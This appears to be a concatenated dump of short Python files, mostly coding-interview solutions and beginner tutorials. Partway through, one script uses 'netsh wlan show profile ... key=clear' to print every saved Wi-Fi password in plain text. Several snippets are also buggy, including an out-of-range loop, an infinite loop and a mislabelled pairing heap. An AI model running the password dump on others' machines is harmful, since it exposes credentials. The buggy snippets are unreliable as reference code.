        for i in range(len(nums) + 1):
            s += nums[i]
            if s > x - s:
                return nums[0 : i + 1]

# Given an array of roses. roses[i] means rose i will bloom on day roses[i].
# Also given an int k, which is the minimum number of adjacent bloom roses required
# for a bouquet, and an int n, which is the number of bouquets we need. Return the
# earliest day that we can get n bouquets of roses.
#
# Example:
# Input: roses = [1, 2, 4, 9, 3, 4, 1], k = 2, n = 2
# Output: 4
# Explanation:
# day 1: [b, n, n, n, n, n, b]
# The first and the last rose bloom.
#
# day 2: [b, b, n, n, n, n, b]
# The second rose blooms. Here the first two bloom roses make a bouquet.
#
# day 3: [b, b, n, n, b, n, b]
#
# day 4: [b, b, b, n, b, b, b]
# Here the last three bloom roses make a bouquet, meeting the required
# n = 2 bouquets of bloom roses. So return day 4.


class Solution:
    def minNumberofDays(self, roses, k, n):

        minDays = max(roses)
        left = 1
        right = minDays

        while left <= right:
            mid = left + ((right - left) // 2)
            boque = 0
            running = 0
            for rose in roses:
                if rose <= mid:
                    running += 1
                    if running == k:
                        boque += 1
                        running = 0
                else:
                    running = 0
            if boque >= n:
                right = mid - 1
                minDays = min(minDays, mid)
            else:
                left = mid + 1
        return minDays


if __name__ == "__main__":
    roses = [1, 2, 5, 9, 3, 4, 1]
    k = 2
    n = 2
    print(Solution().minNumberofDays(roses, k, n))

# In a row of dominoes, A[i] and B[i] represent the top and bottom halves of the i-th domino.
# (A domino is a tile with two numbers from 1 to 6 - one on each half of the tile.)
#
# We may rotate the i-th domino, so that A[i] and B[i] swap values.
#
# Return the minimum number of rotations so that all the values in A are the same, or all
# the values in B are the same.
#
# If it cannot be done, return -1.
#
# Input: A = [2,1,2,4,2,2], B = [5,2,6,2,3,2]
# Output: 2
# Explanation:
# The first figure represents the dominoes as given by A and B: before we do any rotations.
# If we rotate the second and fourth dominoes, we can make every value in the top row equal to 2,
# as indicated by the second figure.
# Example 2:
#
# Input: A = [3,5,1,2,3], B = [3,6,3,3,4]
# Output: -1
# Explanation:
# In this case, it is not possible to rotate the dominoes to make one row of values equal.
# Minimum Domino Rotation


class Solution:
    def min_domino(self, A, B):
        def check(x):

            rotations_a = rotations_b = 0
            for i in range(n):
                if A[i] != x and B[i] != x:
                    return -1
                elif A[i] != x:
                    rotations_a += 1
                elif B[i] != x:
                    rotations_b += 1
            return min(rotations_a, rotations_b)

        n = len(A)
        x = A[0]
        rotations = check(x)

        if rotations != -1:
            return rotations
        else:
            return check(B[0])


if __name__ == "__main__":
    A = [2, 1, 2, 4, 2, 2]
    B = [5, 2, 6, 2, 3, 2]
    print(Solution().min_domino(A, B))

# Given an array of n positive integers and a positive integer s, find the minimal
# length of a contiguous subarray of which the sum ≥ s. If there isn't one, return 0 instead.
#
# Example:
#
# Input: s = 7, nums = [2,3,1,2,4,3]
# Output: 2
# Explanation: the subarray [4,3] has the minimal length under the problem constraint.
# Follow up:
# If you have figured out the O(n) solution, try coding another solution of which the
# time complexity is O(n log n).


class Solution:
    def minSubArrayLen(self, s, nums):
        pointer1 = 0
        pointer2 = 0
        Sum = 0
        count = float("inf")
        while pointer2 < len(nums):

            Sum += nums[pointer2]

            while Sum >= s:
                count = min(count, pointer2 - pointer1 + 1)
                Sum -= nums[pointer1]
                pointer1 += 1

            pointer2 += 1

        if count == float("inf"):
            return 0
        else:
            return count

#!/bin/python3

import math
import os
import random
import re
import sys
from collections import Counter

# Complete the missingNumbers function below.
def missingNumbers(arr, brr):
    res = []
    c = Counter(brr) - Counter(arr)
    return sorted(c.keys())


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    arr = list(map(int, input().rstrip().split()))

    m = int(input())

    brr = list(map(int, input().rstrip().split()))

    result = missingNumbers(arr, brr)

    fptr.write(" ".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

# Given an array containing n distinct numbers taken from 0, 1, 2, ..., n,
# find the one that is missing from the array.
#
# Example 1:
#
# Input: [3,0,1]
# Output: 2
# Example 2:
#
# Input: [9,6,4,2,3,5,7,0,1]
# Output: 8


class Solution:
    def missingNumber(self, nums):
        n = len(nums)
        expectedSum = n * (n + 1) // 2

        actualSum = 0
        for num in nums:
            actualSum += num

        return expectedSum - actualSum

# Enter your code here. Read input from STDIN. Print output to STDOUT
a = int(input())
b = int(input())
print(a // b)
print(a % b)
print(divmod(a, b))

def modularExponential(base, power, mod):
    if power < 0:
        return -1
    base %= mod
    result = 1

    while power > 0:
        if power & 1:
            result = (result * base) % mod
        power = power >> 1
        base = (base * base) % mod
    return result


def main():
    print(modularExponential(3, 200, 13))


if __name__ == "__main__":
    main()

class Solution:
    def isMonotonic(self, A: List[int]) -> bool:
        inc = True
        dec = True
        for i in range(0, len(A) - 1):
            if A[i] > A[i + 1]:
                inc = False
            if A[i] < A[i + 1]:
                dec = False
        return inc or dec

# Morgans Formula In Algebra Set operations
# number(set A) + number(set B) - number(set A interaction B)
# n(a)+ n(b) - n(anb)
# you can add sets or increase the number elements of sets The formula still works

a = {1, 23, 55, 76, 13, 90, 34, 78}
b = {12, 345, 8, 4, 0, 7, 4, 3, 53, 4, 6, 3}

abInteraction = a & b  # & operator interacts two sets
abUnion = a | b  # | operator makes union of two sets

eqn = len(a) + len(b) - len(abInteraction)
print(str(eqn) + " = " + str(len(abUnion)))

# Google | OA 2019 | Most Booked Hotel Room
# Given a hotel which has 10 floors [0-9] and each floor has 26 rooms [A-Z].
# You are given a sequence of rooms, where + suggests room is booked, - room is freed.
# You have to find which room is booked maximum number of times.
#
# You may assume that the list describe a correct sequence of bookings in chronological
# order; that is, only free rooms can be booked and only booked rooms can be freeed.
# All rooms are initially free. Note that this does not mean that all rooms have to be
# free at the end. In case, 2 rooms have been booked the same number of times, return
# the lexographically smaller room.
#
# You may assume:
#
# N (length of input) is an integer within the range [1, 600]
# each element of array A is a string consisting of three characters: "+" or "-";
# a digit "0"-"9"; and uppercase English letter "A" - "Z"
# the sequence is correct. That is every booked room was previously free
# and every freed room was previously booked.
# Example:
#
# Input: ["+1A", "+3E", "-1A", "+4F", "+1A", "-3E"]
# Output: "1A"
# Explanation: 1A as it has been booked 2 times.

import collections


class Solution:
    def maxRoom(self, arr):
        dict = collections.defaultdict(int)
        rooms = arr
        # O(n) time complexicity, for dict space = O(n)
        for room in rooms:
            if room[0] == "+":
                dict[room[1:]] += 1
        Max = 0
        room = ""

        # O(n) Time complexicity O(2)
        for key, val in dict.items():
            if val > Max:
                Max = val
                room = key
        return room


if __name__ == "__main__":
    arr = ["+1A", "+3E", "-1A", "+4F", "+1A", "-3E"]
    print(Solution().maxRoom(arr))

# Given a paragraph and a list of banned words, return the most frequent word that is not in the
# list of banned words.  It is guaranteed there is at least one word that isn't banned, and that the answer is unique.
#
# Words in the list of banned words are given in lowercase, and free of punctuation.
# Words in the paragraph are not case sensitive.  The answer is in lowercase.

# Input:
# paragraph = "Bob hit a ball, the hit BALL flew far after it was hit."
# banned = ["hit"]
# Output: "ball"
# Explanation:
# "hit" occurs 3 times, but it is a banned word.
# "ball" occurs twice (and no other word does), so it is the most frequent non-banned word in the paragraph.
# Note that words in the paragraph are not case sensitive,
# that punctuation is ignored (even if adjacent to words, such as "ball,"),
# and that "hit" isn't the answer even though it occurs more because it is banned.

import collections


class Solution:
    def mostCommonWord(self, paragraph, banned):
        for c in "!?',;.":
            paragraph = paragraph.replace(c, " ")
        dict = collections.Counter(paragraph.lower().split())

        ans = ""
        num = 0
        for word in dict:
            if dict[word] > num and word not in banned:
                ans = word
                num = dict[word]

        return ans

class Solution:
    def moveZeroes(self, nums: List[int]) -> None:
        """
        Do not return anything, modify nums in-place instead.
        """
        t = nums.count(0)
        nzpos = 0
        if t == 0:
            return nums
        for i in range(0, len(nums)):
            if nums[i] != 0:
                nums[nzpos] = nums[i]
                nzpos = nzpos + 1
        for i in range(len(nums) - t, len(nums)):
            nums[i] = 0

# You are given an array of integers and an integer. Write a function that moves
# all instances of that integer in the array to the end of the array. The function
# should perform this in place and does not need to maintain the order of the other integers.
#
# Sample input: [2, 1, 2, 2, 2, 3, 4, 2], 2
#
# Sample output: [1, 3, 4, 2, 2, 2, 2, 2] (the numbers 1, 3, and 4 could be ordered differently)


def moveElementToEnd(array, toMove):
    # Write your code here.
    left = 0
    right = len(array) - 1

    while left < right:
        if array[right] == toMove:
            right -= 1
            continue

        if array[left] == toMove:
            array[left], array[right] = array[right], array[left]
            right -= 1

        left += 1

    return array

# Given an array nums, write a function to move all 0's to the end of
# it while maintaining the relative order of the non-zero elements.
#
# Example:
#
# Input: [0,1,0,3,12]
# Output: [1,3,12,0,0]


class Solution:
    def moveZeroes(self, nums):
        zero = 0  # records the position of "0"
        for i in range(len(nums)):
            if nums[i] != 0:
                nums[i], nums[zero] = nums[zero], nums[i]
                zero += 1

# An array contains both positive and negative numbers in random order.
#  Rearrange the array elements so that all negative numbers appear before all positive numbers.
# Input: -12, 11, -13, -5, 6, -7, 5, -3, -6
# Output: -12 -13 -5 -7 -3 -6 11 6 5


# time complexity O(N)
# space occupied O(2N)
# method 1
def rearrange(arr, n):
    arr1 = []
    arr2 = []
    for integer in arr:
        if integer <= 0:
            arr1.append(integer)
        else:
            arr2.append(integer)
    arr = []
    arr = arr1 + arr2
    return arr


arr = [-12, 11, -13, -5, 6, -7, 5, -3, -6]
n = len(arr)

print(rearrange(arr, n))

# method 2

# Given a stream of integers and a window size, calculate the moving
# average of all integers in the sliding window.
#
# Example:
#
# MovingAverage m = new MovingAverage(3);
# m.next(1) = 1
# m.next(10) = (1 + 10) / 2
# m.next(3) = (1 + 10 + 3) / 3
# m.next(5) = (10 + 3 + 5) / 3

from collections import deque


class MovingAverage:
    def __init__(self, size: int):
        """
        Initialize your data structure here.
        """
        self.size = size
        self.queue = deque()
        self.sum = 0

    def next(self, val: int) -> float:
        self.queue.append(val)
        self.sum += val
        if len(self.queue) > self.size:
            out = self.queue.popleft()
            self.sum = self.sum - out

        return self.sum / len(self.queue)

def multiple(K, d0, d1):
    mul = d0 + d1
    fac = (K - 3) // 4
    repeat = ((2 * mul) % 10) + ((4 * mul) % 10) + ((8 * mul) % 10) + ((6 * mul) % 10)
    sd = mul + (mul % 10) + (repeat * fac)
    if (K - 3) % 4 == 1:
        x = (2 * mul) % 10
    elif (K - 3) % 4 == 2:
        x = ((2 * mul) % 10) + ((4 * mul) % 10)
    elif (K - 3) % 4 == 3:
        x = ((2 * mul) % 10) + ((4 * mul) % 10) + ((8 * mul) % 10)
    sd += x
    if sd % 3 == 0:
        return "YES"
    else:
        return "NO"


for _ in range(int(input())):
    l = [int(x) for x in input().strip().split()]
    K, d0, d1 = l[0], l[1], l[2]
    print(multiple(K, d0, d1), end="\n")

# def smallestMultiple(l, r):
#    for i in range(1,8**7):
#        s = True
#        for j in range(l, r+1):
#            if i%j!=0:
#                s = False
#        if s:
#            return i


def smallestMultiple(l, r):
    for i in range(1, 16):
        for j in range(l, r + 1):
            while True:
                if i % j != 0:
                    break
            return i

def mutate_string(string, position, character):
    return string[0:position] + character + string[position + 1 :]


if __name__ == "__main__":
    s = input()
    i, c = input().split()
    s_new = mutate_string(s, int(i), c)
    print(s_new)

def variableName(name):
    str_name = [i for i in str(name)]
    non_acc_chars = [
        " ",
        ">",
        "<",
        ":",
        "-",
        "|",
        ".",
        ",",
        "!",
        "[",
        "]",
        "'",
        "/",
        "@",
        "#",
        "&",
        "%",
        "?",
        "*",
    ]
    if str_name[0] in str([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]):
        return False
    for j in range(len(str_name)):
        if str_name[j] in non_acc_chars:
            return False
    return True

def fileNaming(names):
    if names == []:
        return []
    new_names = []
    for name in names:
        if name not in new_names:
            new_names.append(name)
        else:
            for i in range(1, 1000):
                new_name = name + "(" + str(i) + ")"
                if new_name not in new_names:
                    new_names.append(new_name)
                    break
    return new_names

class Solution:
    # @param A : list of integers
    # @return a list of integers
    def prevSmaller(self, A):
        G = []
        stack = []
        for i in range(len(A)):
            while stack and stack[-1] >= A[i]:
                stack.pop()
            if not stack:
                G.append(-1)
            else:
                G.append(stack[-1])
            stack.append(A[i])
        return G

from operator import itemgetter

if __name__ == "__main__":
    students = []
    res = []
    for _ in range(int(input())):
        name = input()
        score = float(input())
        students.append([name, score])
    students = sorted(students, key=itemgetter(1))
    maxg = students[0][1]
    for i in range(len(students)):
        if students[i][1] > maxg:
            maxg = students[i][1]
            break
    for i in range(len(students)):
        if maxg == students[i][1]:
            res.append(students[i][0])
    for i in sorted(res):
        print(i)

def newton(
    function, function1, startingInt
):  # function is the f(x) and function1 is the f'(x)
    x_n = startingInt
    while True:
        x_n1 = x_n - function(x_n) / function1(x_n)
        if abs(x_n - x_n1) < 0.00001:
            return x_n1
        x_n = x_n1


def f(x):
    return (x ** 3) - 2 * x - 5


def f1(x):
    return 3 * (x ** 2) - 2


print(newton(f, f1, 3))

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the minimumBribes function below.
def minimumBribes(q):
    q = [P - 1 for P in q]
    c = 0
    for i, x in enumerate(q):
        if x - i > 2:
            print("Too chaotic")
            return
        for j in range(max(x - 1, 0), i):
            if q[j] > x:
                c += 1
    print(c)


if __name__ == "__main__":
    t = int(input())

    for t_itr in range(t):
        n = int(input())

        q = list(map(int, input().rstrip().split()))

        minimumBribes(q)

# first we will import the subprocess module
import subprocess

# now we will store the profiles data in "data" variable by
# running the 1st cmd command using subprocess.check_output
data = (
    subprocess.check_output(["netsh", "wlan", "show", "profiles"])
    .decode("utf-8")
    .split("\n")
)

# now we will store the profile by converting them to list
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

# using for loop in python we are checking and printing the wifi
# passwords if they are available using the 2nd cmd command
for i in profiles:
    # running the 2nd cmd command to check passwords
    results = (
        subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"])
        .decode("utf-8")
        .split("\n")
    )
    # storing passwords after converting them to list
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    # printing the profiles(wifi name) with their passwords using
    # try and except method
    try:
        print("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
        print("{:<30}|  {:<}".format(i, ""))

# Implementing Newton Raphson method in python
# Author: Haseeb

from sympy import diff
from decimal import Decimal
from math import sin, cos, exp


def NewtonRaphson(func, a):
    """ Finds root from the point 'a' onwards by Newton-Raphson method """
    while True:
        x = a
        c = Decimal(a) - (Decimal(eval(func)) / Decimal(eval(str(diff(func)))))

        x = c
        a = c
        # This number dictates the accuracy of the answer
        if abs(eval(func)) < 10 ** -15:
            return c


# Let's Execute
if __name__ == "__main__":
    # Find root of trignometric fucntion
    # Find value of  pi
    print("sin(x) = 0", NewtonRaphson("sin(x)", 2))

    # Find root of polynomial
    print("x**2 - 5*x +2 = 0", NewtonRaphson("x**2 - 5*x +2", 0.4))

    # Find Square Root of 5
    print("x**2 - 5 = 0", NewtonRaphson("x**2 - 5", 0.1))

    #  Exponential Roots
    print("exp(x) - 1 = 0", NewtonRaphson("exp(x) - 1", 0))

class Solution:
    # @param A : list of integers
    # @return an integer
    def solve(self, A):
        A = [item for item in A if item >= 0]
        A.sort()
        for i in range(len(A) - 1):
            if A[i] == A[i + 1]:
                continue
            if A[i] == len(A) - i - 1:
                return 1
        if A and A[-1] == 0:
            return 1
        return -1

class Solution:
    def tribonacci(self, n: int) -> int:
        if n == 0:
            return 0
        if n == 1 or n == 2:
            return 1
        dp = [0 for _ in range(n + 1)]
        dp[0] = 0
        dp[1] = 1
        dp[2] = 1
        for i in range(3, n + 1):
            dp[i] = dp[i - 3] + dp[i - 2] + dp[i - 1]
        return dp[-1]

memo = {}


def isHappy(n):
    """
    Is happy takes in a number and returns True if it is a happy number, False otherwise. A happy number
    is a number defined by the following process: Starting with any positive integer, replace the number by the
    sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay),
    or it loops endlessly in a cycle which does not include 1.
    """
    seen = {n: 1}
    while True:
        new_sq = sum([int(d) ** 2 for d in str(n)])
        if n == 1:
            return True
        if new_sq in seen:
            return False
        else:
            n = new_sq
            seen[n] = 1


print(isHappy(19))

from collections import deque


class Solution:
    def numIslands(self, grid) -> int:
        if not grid:
            return 0
        r = len(grid)
        c = len(grid[0])
        queue = deque()
        islands = 0
        for i in range(r):
            for j in range(c):
                if grid[i][j] == "1":
                    islands += 1
                    grid[i][j] = "0"
                    queue.append([i, j])
                    while queue:
                        el = queue.popleft()
                        rs = el[0]
                        cs = el[1]
                        if rs - 1 >= 0 and grid[rs - 1][cs] == "1":
                            queue.append([rs - 1, cs])
                            grid[rs - 1][cs] = "0"
                        if rs + 1 < r and grid[rs + 1][cs] == "1":
                            queue.append([rs + 1, cs])
                            grid[rs + 1][cs] = "0"
                        if cs - 1 >= 0 and grid[rs][cs - 1] == "1":
                            queue.append([rs, cs - 1])
                            grid[rs][cs - 1] = "0"
                        if cs + 1 < c and grid[rs][cs + 1] == "1":
                            queue.append([rs, cs + 1])
                            grid[rs][cs + 1] = "0"
        return islands

class RecentCounter:
    def __init__(self):
        self.q = collections.deque()

    def ping(self, t: int) -> int:
        self.q.append(t)
        while self.q[0] < t - 3000:
            self.q.popleft()
        return len(self.q)

from collections import Counter


def singleNumber(nums):
    """
    given a list of integer with every element appears twice and a single number appears once, return the value of the
    single number
    """
    count = Counter(nums)
    for k, v in count.items():
        if v == 1:
            return k


print(singleNumber([2, 2, 4, 1, 5]))

# Given a 2d grid map of '1's (land) and '0's (water), count the number of islands.
# An island is surrounded by water and is formed by connecting adjacent lands
# horizontally or vertically. You may assume all four edges of the grid are all
# surrounded by water.
#
# Example 1:
#
# Input:
# 11110
# 11010
# 11000
# 00000
#
# Output: 1
# Example 2:
#
# Input:
# 11000
# 11000
# 00100
# 00011
#
# Output: 3


class Solution:
    def __init__(self, grid):
        self.grid = grid

    def is_island(self):
        def sink_island(grid, r, c):
            if grid[r][c] == "1":
                grid[r][c] = 0
            else:
                return
            if r - 1 >= 0:
                sink_island(grid, r - 1, c)
            if r + 1 < len(grid):
                sink_island(grid, r + 1, c)
            if c - 1 >= 0:
                sink_island(grid, r, c - 1)
            if c + 1 < len(grid[0]):
                sink_island(grid, r, c + 1)

        counter = 0
        for i in range(len(self.grid)):
            for j in range(len(self.grid[0])):
                if self.grid[i][j] == "1":
                    counter += 1
                    sink_island(self.grid, i, j)
        return counter


if __name__ == "__main__":
    grid1 = [
        ["1", "1", "1", "1", "0"],
        ["1", "1", "0", "1", "0"],
        ["1", "1", "0", "0", "0"],
        ["0", "0", "0", "0", "0"],
    ]
    grid2 = [
        ["1", "1", "0", "0", "0"],
        ["1", "1", "0", "0", "0"],
        ["0", "0", "1", "0", "0"],
        ["0", "0", "0", "1", "1"],
    ]
    print(Solution(grid1).is_island())
    print(Solution(grid2).is_island())

def avoidObstacles(inputArray):
    for i in range(2, max(inputArray) + 2):
        if i not in inputArray and all(j % i != 0 for j in inputArray):
            return i

# Given a singly linked list, group all odd nodes together followed by the even nodes.
# Please note here we are talking about the node number and not the value in the nodes.
# You should try to do it in place. The program should run in O(1) space complexity and
# O(nodes) time complexity.
# Example 1:
# Input: 1->2->3->4->5->NULL
# Output: 1->3->5->2->4->NULL
# Example 2:
# Input: 2->1->3->5->6->4->7->NULL
# Output: 2->3->6->7->1->5->4->NULL


class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def oddeven(self, head):

        if not head:
            return []

        odds = ListNode(0)
        evens = ListNode(0)
        oddshead = odds
        evenshead = evens
        isodd = True

        while head:
            if isodd:
                odds.next = head
                odds = odds.next
            else:
                evens.next = head
                evens = evens.next
            isodd = not isodd
            head = head.next
        evens.next = None
        odds.next = evenshead.next
        return oddshead.next


if __name__ == "__main__":
    node = ListNode(1)
    node.next = ListNode(2)
    node.next.next = ListNode(3)
    node.next.next.next = ListNode(4)
    node.next.next.next.next = ListNode(5)
    newnode = Solution().oddeven(node)

    while newnode:
        print(newnode.val)
        newnode = newnode.next

# def sumOfTheAngles(n):
#    return (n - 2) * 180

sumOfTheAngles = lambda n: (n - 2) * 180

# n = eval(dir()[0])
# return (n - 2) * 180

def visitsOnCircularRoad(n, v):
    c = 1
    t = 0
    for i in v:
        t += min(abs(i - c), abs(n - abs(i - c)))
        c = i
    return t


# v = visitsOrder
# n = number of houses
# c = Current position
# t = Time

# pre code
# main list of contacts
contacts = {}

# funcs of pre code
# func to add new contact
def newContact():
    while True:
        newContact = raw_input("Name for new Contact : ")
        numForNewContact = raw_input("Number for Contact : ")
        add = raw_input("Add or Try again :")
        if add.strip() == "Add":
            contacts[newContact] = numForNewContact
            print("Contact Successfully added.")
            break
        elif add.strip() == "Try again":
            continue
        else:
            print("Invalid Input.try again")
            continue
        startAgain = raw_input("Add more or continue : ")
        if startAgain.strip() == "Add more":
            print(" ")
            continue
        elif startAgain.strip() == "continue":
            print(" ")
            break


# func to search for a contact
def searchContact():
    while True:
        search = raw_input("Search for contact : ")
        toShow = str(search) + contacts[search]
        print(toShow)
        startAgain = raw_input("Search more or continue : ")
        if startAgain.strip() == "Search more":
            print(" ")
            continue
        elif startAgain.strip() == "continue":
            print(" ")
            break


# func to edit a contact
def editContact():
    while True:
        whichToEdit = raw_input("Name of Contact of which Number to Edit : ")
        contacts[whichToEdit] = raw_input("Number to add : ")
        startAgain = raw_input("Edit more or continue : ")
        if startAgain.strip() == "Edit more":
            print(" ")
            continue
        elif startAgain.strip() == "continue":
            print(" ")
            break


# main code to interact
while True:
    print("hello,".title())
    # part of main code to start or end
    startOrEnd = raw_input("Start or End : ")
    if startOrEnd.strip() == "Start":
        # part of main code to control functions
        addSearchEdit = raw_input("Add or Search or Edit : ")
        if addSearchEdit.strip() == "Add":
            print(newContact())
        elif addSearchEdit.strip() == "Search":
            print(searchContact())
        elif addSearchEdit.strip() == "Edit":
            print(editContact())
        else:
            print("Invalid Input . Try Again")
            continue
    elif startOrEnd.strip() == "End":
        print("Ending...")
        break
    else:
        print("Invalid Input . Try Again")
        continue
    # part of main code to start again or end
    startAgain = raw_input("Start again or End : ")
    if startAgain.strip() == "Start again":
        print("Starting  again...")
        continue
    elif startAgain.strip() == "End":
        print("Ending program...")
        break
    else:
        break

# This example shows you string operations

name = "Kalpak"
print("My name is " + name)  # I have given space after is notice

age = 14
print("My age is ", age)  # comma seprates two different things you want to print

print("This isn't going away too soon.")  # that \ is called as an escape character
# the \ is used to use same quote in a string

print(
    "I love newlines \n"
)  # \n prints new line after string or according to its position

print("\t I love tabs")  # \t adds a tab according to its position

multiple = "Iron Man"
print(multiple * 5)  # this will print string 5 times

# string methods in built
country = "Norway"
print(country.upper())  # prints all letters in upper case
print(country.lower())  # prints all letters in lower case
print(country.title())  # converts into title

# string formatting
print("%s %s %s" % ("I", "am", "cool"))

expression = "I love"
movie = "Captain America 3"
print("%s %s" % (expression, movie))

# type conversion
addition = 12343 + 3349
print("The answer is " + str(addition))  # str() method converts non-string into string

# list operations part 2

siliconValley = [
    "Google",
    "Apple",
    "Dropbox",
    "Facebook",
    "Cisco",
    "Adobe",
    "Oracle",
    "Samsung",
]
print(siliconValley)

# hmm seems like i forgot to add Electronic Arts in the list siliconValley
# This will add the element at the end of the list
siliconValley.append("Electronic Arts")
print(siliconValley)

# thats cool but I want my element at specific position
siliconValley.insert(5, "AMD")
# 5 is the position and whatever you add after comma is element

# Okay enough I want to pop out an element from list and I want to use it in a string
# you have to provide the index of elementyou want to pop out
poppedElement = siliconValley.pop(4)
print("Popped element is " + poppedElement)

# Oops I Samsung isnt in silicon valley, I have to remove Samsung from list
# How am I gonna do thats
# You have to enter the element in parenthesis and not it's index
siliconValley.remove("Samsung")
print(siliconValley)

# I want to sort the list in alphabetical order
# How to do thats
# simple
siliconValley.sort()
# or
sorted(siliconValley)
print(siliconValley)

# I wanted list in reverse alphabetical order
# simple
siliconValley.sort(reverse=True)
# or
sorted(siliconValley, reverse=True)  # seperate the reverse with comma
print(siliconValley)

# Okay what if i dont know about the index of an element but i want to print only that element
googleIndex = siliconValley.index("Google")
print(siliconValley[googleIndex])

# I am tired of watching those elements again and again
# How I am going to do thats
# easy
del siliconValley
print(siliconValley)  # this should probably give you an NameError

class ListFastSum:
    def __init__(self, nums):
        self.nums = nums
        self.sum_up_to = []

        current_sum = 0
        for num in nums:
            current_sum += num
            self.sum_up_to.append(current_sum)

        # Allows self.sum_up_to[-1] = 0
        self.sum_up_to.append(0)

    def sum(self, start_idx, end_idx):
        return self.sum_up_to[end_idx - 1] - self.sum_up_to[start_idx - 1]


print(ListFastSum([1, 2, 3, 4, 5, 6, 7]).sum(2, 5))
# 12 because 3 + 4 + 5 = 12

# There is a fence with n posts, each post can be painted with one of the k colors.
#
# You have to paint all the posts such that no more than two adjacent fence posts have the same color.
#
# Return the total number of ways you can paint the fence.
#
# Note:
# n and k are non-negative integers.
#
# Example:
#
# Input: n = 3, k = 2
# Output: 6
# Explanation: Take c1 as color 1, c2 as color 2. All possible ways are:
#
#             post1  post2  post3
#  -----      -----  -----  -----
#    1         c1     c1     c2
#    2         c1     c2     c1
#    3         c1     c2     c2
#    4         c2     c1     c1
#    5         c2     c1     c2
#    6         c2     c2     c1


class Solution:
    def numWays(self, n, k):

        if n == 0:
            return 0
        if n == 1:
            return k

        same, diff = k, k * (k - 1)

        for i in range(3, n + 1):
            same, diff = diff, (same + diff) * (k - 1)

        return same + diff

#!/usr/bin/env python
# coding: utf-8

# In[1]:


class PairingHeap:
    def __init__(self):
        self.heap = [0]
        self.size = 0
        self.root = min(self.heap)

    def insert(self, value):
        self.heap.append(value)
        self.size += 1
        self.BubbleUp(self.size)

    def merge(self, root1, root2):
        if root1 is None:
            return root2
        elif root2 is None:
            return root1
        elif root1 < root2:
            self.heap.append(root2)
            return root1

        else:
            self.heap.append(root1)
        return root2

    def delete(self):
        self.root = None
        self.heap[1], self.heap[-1] = self.heap[-1], self.heap[1]
        deletedValue = self.heap.pop(-1)
        self.size -= 1
        return deletedValue

    def findMin(self):
        if self.root == None:
            print("Pairing Heap is empty")
        else:
            return self.root

    def getSize(self):
        print(len(self.heap))

    # Two Pass Method

    def BubbleUp(self, key):
        if self.heap[key] > self.heap[key // 2] or key <= 1:  # parent and child
            return ()
        else:
            self.heap[key], self.heap[key // 2] = self.heap[key // 2], self.heap[key]
            return self.BubbleUp(key // 2)


# Driver Code

heap = PairingHeap()

print("Pairing Heap upon Insertion:")
heap.insert(2)
heap.insert(18)
heap.insert(20)
heap.insert(1)
heap.insert(3)
heap.insert(8)
print(heap.heap)
print()

print("Getting Mininmum in pairing heap:")
print(heap.findMin())
print()

print("Merging roots in pairing heaps:")
print("Smaller root =", heap.merge(5, 1))
print("Heap after merge:")
print(heap.heap)
print()

print("Pairing Heap after deleting:")
heap.delete()
heap.delete()
print(heap.heap)
print()

print("Size of Pairing Heap:")
heap.getSize()

## BruteForce Solution that runs in O(n^2 * k) time
## K -> length of longest string that is checked


def isPalindrome(s):
    return s == s[::-1]


def palindromePair(arr):
    res = []
    size = len(arr)
    for i in range(size - 1):
        for j in range(i + 1, size):
            cc = arr[i] + arr[j]
            if isPalindrome(cc):
                res.append([i, j])

            cc = arr[j] + arr[i]
            if isPalindrome(cc):
                res.append([j, i])

    return res

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution1:
    def isPalindrome(self, head: ListNode) -> bool:
        temp = head
        stack = []
        l = 0
        while temp:
            l += 1
            temp = temp.next
        temp = head
        for i in range(0, l // 2):
            stack.append(temp.val)
            temp = temp.next
        if l % 2 != 0:
            temp = temp.next
        for i in range(0, l // 2):
            if temp.val == stack.pop():
                continue
            return False
        return True


# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution2:
    def isPalindrome(self, head: ListNode) -> bool:
        el = []
        while head:
            el.append(head.val)
            head = head.next
        for i in range(0, len(el) // 2):
            if not el[i] == el[-i - 1]:
                return False
        return True

class Solution:
    def isPalindrome(self, x: int) -> bool:
        a = []
        x = str(x)
        x = list(x)
        a = x[::-1]
        if str(a) == str(x):
            return True
        else:
            return False

def buildPalindrome(st):
    for i in range(len(st)):
        sub = st[i : len(st)]
        if sub[::-1] == sub:
            missing = st[0:i]
            return st + missing[::-1]
    return st

# Given a singly linked list, determine if it is a palindrome.
#
# Input: 1->2
# Output: false
#
# Input: 1->2->2->1
# Output: true

# Palindromic Linked List
# 4 --> 3 --> 2
# take half and revers and check
# two pointer method fast and slow
# Time Complexity is O(n) and Space


class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def isPalindrome(self, head):
        first_half_end = self.first_half_end(head)
        second_half_start = self.reverse_ll(first_half_end.next)

        first_position = head
        second_position = second_half_start
        while second_position is not None:
            if second_position.val != first_position.val:
                return False
            first_position = first_position.next
            second_position = second_position.next
        return True

    def reverse_ll(self, node):
        curr = node
        prev = None
        while curr:
            temp = curr.next
            curr.next = prev
            prev = curr
            curr = temp
        return prev

    def first_half_end(self, node):
        fast = node
        slow = node
        while fast.next is not None and fast.next.next is not None:
            fast = fast.next.next
            slow = slow.next
        return slow


if __name__ == "__main__":

    #  1 - > 2 - > 3 - > 2 -> 1
    node_list = [1, 2, 3, 2, 1]
    node = ListNode(node_list[0])
    curr = node
    for i in node_list[1:]:
        curr.next = ListNode(i)
        curr = curr.next
    print(Solution().isPalindrome(node))

# Given a string, determine if a permutation of the string could form a palindrome.
#
# Example 1:
#
# Input: "code"
# Output: false
# Example 2:
#
# Input: "aab"
# Output: true
# Example 3:
#
# Input: "carerac"
# Output: true

import collections


class Solution:
    def canPermutePalindrome(self, s):

        dict = collections.Counter(s)
        num = 0
        for val in dict.values():
            if val % 2 == 0:
                num += val
